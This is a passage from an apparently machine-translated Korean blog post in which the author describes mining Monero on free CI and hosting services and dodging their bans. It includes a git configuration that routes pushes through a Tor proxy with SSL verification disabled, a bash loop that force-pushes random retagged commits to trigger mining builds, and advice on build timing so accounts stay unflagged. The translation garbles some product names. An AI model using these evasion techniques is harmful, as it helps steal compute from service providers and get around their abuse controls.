있었습니다.</p><p><a href="https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome"> 무인 비행기</a>  전체 16개 이상의 코어 프로세서에 대한 액세스 권한을 부여했지만 2개의 빌드 후에 금지되었습니다.<sup id="fnref:saddrone"><a class="fnref" href="#fndef:saddrone">[13]</a></sup>. <a href="https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship"> 코드십</a>  또한 강력한 빌드 호스트에 대한 액세스를 제공하며 드론만큼 공격적으로 금지하지 않았습니다.</p><p>수익성 때문이 아니라 용이함과 편리함(다른 프로젝트에서도)을 위해 내가 가장 좋아하는 서비스는<a href="https://web.archive.org/web/20210324163536/https://travis-ci.org/"> 트래비스</a>, <a href="https://web.archive.org/web/20210308041527/https://semaphoreci.com/"> 신호기</a>  그리고<a href="https://web.archive.org/web/20210322105637/https://hub.docker.com/"> 도커 허브</a> . Travis는 표준 CI와 같으며 매우 유연합니다. Semaphore는<code>DSL</code>  ~을위한<code>CI</code>  다른 UI와 같이 스파게티 형식의 체크 박스가 끝없이 연속되는 대신에 접근하기 쉽고 잘 보였습니다. Docker는 도커 파일을 빌드에 매핑하는 단순함을 제공합니다.</p><h3 id="builds_configs"><a class="header-anchor" href="#builds_configs"> 구성 빌드</a></h3><p> 빌드는 웹 서비스 또는 git 커밋에서 제공하는 cron 작업에 의해 트리거되었습니다. 따라서 모든 git 커밋을 관리하려면 액세스 토큰이나 ssh 키의 쓰레기를 추적해야 했습니다. 커밋을 과도하게 스팸하지 않고 git을 구성하는 리포지토리로 푸시할 때 프록시를 사용하는 것도 중요했습니다.</p><pre><code class="toml hljs"><span class="hljs-section">[http]</span><span class="hljs-attr">proxy</span> = socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span><span class="hljs-attr">sslverify</span> = <span class="hljs-literal">false</span><span class="hljs-section">[https]</span><span class="hljs-attr">proxy</span> = socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span><span class="hljs-attr">sslverify</span> = <span class="hljs-literal">false</span><span class="hljs-section">[url "https://"]</span><span class="hljs-attr">insteadOf</span> = git://</code></pre><p> git 호스팅 서비스를 사용하여 github가 금지에 대해 더 철저했지만 ci 서비스 관리자의 남용 보고서에 의해서만 실행되었으며 gitlab은 CI 평가판을 갱신하려고 할 때 금지 웨이브를 한 번 실행했습니다 (부주의하게). 나는 bitbucket 계정에 대한 금지를 받은 적이 없습니다. (강제로) git 커밋을 푸시하기 위해 git 저장소에 다시 태그를 지정하는 장기 실행 루프가 있습니다.</p><pre><code class="bash hljs"><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span>
    repos_count=$(ls -ld <span class="hljs-variable">${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span><span class="hljs-variable">$repos</span>/*; <span class="hljs-keyword">do</span><span class="hljs-built_in">cd</span><span class="hljs-string">"<span class="hljs-variable">$r</span>"</span>
        git fetch --all
        tagger
        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[32m"</span><span class="hljs-string">"sleeping for <span class="hljs-variable">$repos_ival</span> since <span class="hljs-subst">$(date +%H:%M:%S\ %b/%d)</span>"</span><span class="hljs-string">"\e[0m"</span>
        sleep <span class="hljs-variable">$repos_ival</span><span class="hljs-keyword">done</span>
    sleep 1
<span class="hljs-keyword">done</span></code></pre><p>강제로 이런 식으로 푸시하는 것은 github이 그다지 좋아하지 않는 것이어서 계정에 플래그가 지정되는 원인이 되었을 수 있습니다. 다른 커밋을 강제로 푸시하는 태거 기능은 임의의 커밋을 제공하는 웹 사이트(매우 쉽게 조회할 수 있음)를 사용합니다. 커밋의 내용 자체가 내 경우에 분명히 의심스럽기 때문에 이것이 얼마나 도움이 되는지 잘 모르겠습니다. 또한 이 명령에서 반환된 커밋에는 욕설이 포함될 수 있기 때문에 내 커밋 중 하나가 욕설로 git 커밋을 추적하는 트위터 봇에 의해 선택되었습니다! 사건 이후 욕설 블랙리스트를 추가했습니다.</p><p> 난독화된 git 커밋과 난독화된 git 리포지토리에 대해 자세히 알아보지 않았습니다. 시스템이 모바일 앱과 같은 환경을 인식하지 못하면 빌드를 설정할 수 없기 때문에 좀 더 정교한 리포지토리를 사용하는 유일한 경우는 Bitrise였습니다. 아주 쉽게 발견할 수 있는 저장소.</p><p> 전반적으로 최적의 채굴 시간을 중심으로 종형 곡선을 그려야 한다면<em> 없이</em>테스트된 모든 서비스에서 계정이 금지되는 것은 하루에 한 번 빌드 기간이 약 1시간이 될 것입니다. CPU 코어의 경우 몇 가지 거짓말쟁이(드론과 같은)를 제외하고 대부분의 서비스는 빌드가 제한된 리소스가 있는 VM 또는 컨테이너 내에서 실행되기 때문에 제공된 리소스의 전체 양을 사용할 것으로 예상합니다. 컴파일은 일반적으로 다음과 같은 작업입니다. CPU를 포화시키므로 통계적 관련성이 없습니다. 직관적으로 하루에 하나의 빌드는 일반 개발자가 하는 일이므로 평균에서 벗어나면 플래그가 제기될 것으로 예상해야 하며 남용에 대한 추진은 결코 잘 끝나지 않습니다.</p><h2 id="conclusions"><a class="header-anchor" href="#conclusions"> 결론</a></h2><p> 그럴만한 가치가 있었나요? 네트워킹 부분은 확실히 흥미로웠고 계정 등록을 처리하는 것은 분명히 최악의 부분이었습니다. 결국 아무도 끝없는 확인 이메일을 클릭하고 정신을 마비시키는 UI 절차를 반복하는 것을 좋아하지 않았습니다. 스팸 자동화 소프트웨어를 작성하는 것도 지루하고(대부분 멍청한 API를 파고들기 때문에) 이 가정(그리고 이것이 결코 심각한 것이 아니라는 사실)을 가지고 나는 그것을 고려조차 하지 않았습니다. 수익성이 있었나요? 절정에는 다음과 같은 수준에 도달했습니다.<code>300$</code>  한 달에, 아마도 베네수엘라에게는 충분하지만 실제로는 그렇지 않습니다. :)</p><p></p><table class="fndef" id="fndef:adversary"><tbody><tr><td class="fndef-backref"><a href="#fnref:adversary">[1]</a></td><td class="fndef-content"><em> 심술궂은 시스템 관리자</em></td></tr></tbody></table><table class="fndef" id="fndef:infoproc"><tbody><tr><td class="fndef-backref"><a href="#fnref:infoproc">[2]</a></td><td class="fndef-content"> 이것이 많은 개인 정보 보호 가정을 깨뜨릴지라도 대부분의 사람들은 현재 문제가 있을 때마다 내부를 엿볼 뿐이라고 확신하지만 이것은 컨테이너 기반 런타임의 문제일 뿐인 반면 VM은 거의 블랙박스입니다.</td></tr></tbody></table><table class="fndef" id="fndef:monerominer"><tbody><tr><td class="fndef-backref"><a href="#fnref:monerominer">[3]</a></td><td class="fndef-content"> monero 노드에 내장된 광부는 백그라운드 친화적으로 만들기 위해 약간의 작업을 수행했지만 xmrig의 배포는 백그라운드 친화성에 초점을 맞추지 않았습니다.</td></tr></tbody></table><table class="fndef" id="fndef:difficulty"><tbody><tr><td class="fndef-backref"><a href="#fnref:difficulty">[5]</a></td><td class="fndef-content">일부 풀은 서로 다른 연결 포트에서 다른 어려움을 제공하고 작업 난이도를 광부가 제출한 공유에 맞추는 경향이 있지만 프록시의 세분성은 풀을 방지할 수 있으므로 여전히 더 편리했습니다.<a href="https://en.wikipedia.org/wiki/Vendor_lock-in"> 가두어 넣다</a>  (우리는 실제로 풀을 전환한 적이 없지만).</td></tr></tbody></table><table class="fndef" id="fndef:configwatch"><tbody><tr><td class="fndef-backref"><a href="#fnref:configwatch">[4]</a></td><td class="fndef-content"> 구성이 갑자기 나타났다가 파일 시스템에서 사라졌을 때 행복하지 않았습니다.</td></tr></tbody></table><table class="fndef" id="fndef:stratumprotocol"><tbody><tr><td class="fndef-backref"><a href="#fnref:stratumprotocol">[6]</a></td><td class="fndef-content"> 우리는 에 대해 이야기하지 않습니다<a href="https://en.bitcoin.it/wiki/Stratum_mining_protocol"> 계층 프로토콜</a>  구현된 모든 것을 처리해야 하기 때문에<em> 둘 다</em>  풀과 광부...일반적으로 최소한의 기능이며 비표준 확장 기능이 있을 수 있습니다.</td></tr></tbody></table><table class="fndef" id="fndef:fullbash"><tbody><tr><td class="fndef-backref"><a href="#fnref:fullbash">[7]</a></td><td class="fndef-content"> 절대 풀 배쉬로 가지 마세요 :)</td></tr></tbody></table><table class="fndef" id="fndef:memoryondemand"><tbody><tr><td class="fndef-backref"><a href="#fnref:memoryondemand">[8]</a></td><td class="fndef-content"> 커널이 실행 파일의 메모리 레이아웃에서 주소를 찾고 파일 시스템에 액세스하여 충돌을 일으킬 수 있기 때문에 프로세스가 런타임에 추가 기능을 로드할 때 어떤 일이 발생하는지 살펴보지 않았습니다.</td></tr></tbody></table><table class="fndef" id="fndef:freehostinglimits"><tbody><tr><td class="fndef-backref"><a href="#fnref:freehostinglimits">[9]</a></td><td class="fndef-content"> 제한은 임의적이며 CPU 시간은 1초 미만, 메모리는 128M 미만, 아웃바운드 연결은 차단됩니다.</td></tr></tbody></table><table class="fndef" id="fndef:cpanelssh"><tbody><tr><td class="fndef-backref"><a href="#fnref:cpanelssh">[10]</a></td><td class="fndef-content"> 약간의 인내심으로 cpanel 계정 공간 주위에 부트스트랩된 환경에서 전체 ssh 인스턴스를 실행할 수도 있습니다.<em> 없이</em>  호스팅 공급자가 비활성화하는 경향이 있는 cpanel 내장 SSH에 액세스할 수 있습니다.</td></tr></tbody></table><table class="fndef" id="fndef:openshift"><tbody><tr><td class="fndef-backref"><a href="#fnref:openshift">[11]</a></td><td class="fndef-content"> openshift는 1년 프리 티어에서 3개월, 1개월로 바뀌었고 전화 인증이 필요하기 시작했습니다.</td></tr></tbody></table><table class="fndef" id="fndef:herokucontainers"><tbody><tr><td class="fndef-backref"><a href="#fnref:herokucontainers">[12]</a></td><td class="fndef-content"> Heroku 프리 티어 컨테이너는 리소스가 상당히 관대하며 4c/8t(가상) CPU, 충분한 램 및 대용량 스토리지를 제공합니다(그러나 영구적이지 않고 dyno 종료 시 폐기됨).</td></tr></tbody></table><table class="fndef" id="fndef:saddrone"><tbody><tr><td class="fndef-backref"><a href="#fnref:saddrone">[13]</a></td><td class="fndef-content">그들은 훨씬 더 엄격한 등록 규칙을 추가했습니다. 몇 번의 금지 후에 내가 그것에 기여했을 수도 있습니다.</td></tr></tbody></table><p></p><div id="post-tags-list"> 
게시물 태그:
<span class="post-tag"><a href="tag/crypto" style="">  암호</a>, </span><span class="post-tag"><a href="tag/net" style="">  그물</a>, </span><span class="post-tag"><a href="tag/shell" style="">  껍데기</a></span></div><div class="page-foot"><div class="copyright"> 
        2021년 8월 21일
    </div><script async="" crossorigin="anonymous" issue-term="pathname" label="Comment" repo="untoreh/untoreh.github.io" src="https://utteranc.es/client.js"></script></div></div><div class="page__footer"><footer><div class="page__footer-copyright"> 
            © unreh - 제공<a href="https://github.com/tlienart/Franklin.jl"> 프랭클린</a></div><div class="page__footer-links">
            -
            <ul><li><a href="/ko/sitemapxml"> 사이트맵</a></li>
                |
                <li><a href="/ko/tag"> 태그</a></li>
                |
                <li><a href="/ko/feedxml"> RSS</a></li></ul></div><ul class="author__wrap"><li class="author__urls social-icons"><a href="https://twitter.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-twitter-square"></i></a></li><li class="author__urls social-icons"><a href="https://github.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-github"></i></a></li><li class="author__urls social-icons"><a href="mailto:contact@unto.re"><i class="fas fa-envelope"></i></a></li><li><script class="" id="" type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></li></ul></footer></div><script crossorigin="anonymous" defer="" id="fa" integrity="sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH" src="https://use.fontawesome.com/releases/v5.8.2/js/all.js"></script><script src="/libs/colors.js"></script><script src="/libs/menu.js"></script><script defer="" src="/libs/lunr/lunr.min.js"></script></body></HTML>